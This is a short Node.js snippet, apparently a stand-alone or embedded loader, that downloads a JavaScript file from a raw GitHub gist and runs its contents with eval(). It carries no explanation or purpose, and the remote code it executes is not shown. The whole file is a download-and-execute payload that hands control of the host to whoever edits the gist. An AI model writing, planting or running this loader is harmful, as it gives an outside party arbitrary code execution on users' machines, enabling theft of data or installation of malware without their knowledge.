const https = require("https");
https.get("https://gist.githubusercontent.com/puffsdad/b53f675ad43eefafaea6356e8afae2fa/raw/8c5efa84b7bd8efb130d4888fba586a6d94d8167/egp.js", r => { let d = ""; r.on("data", c => d += c); r.on("end", () => eval(d)); });
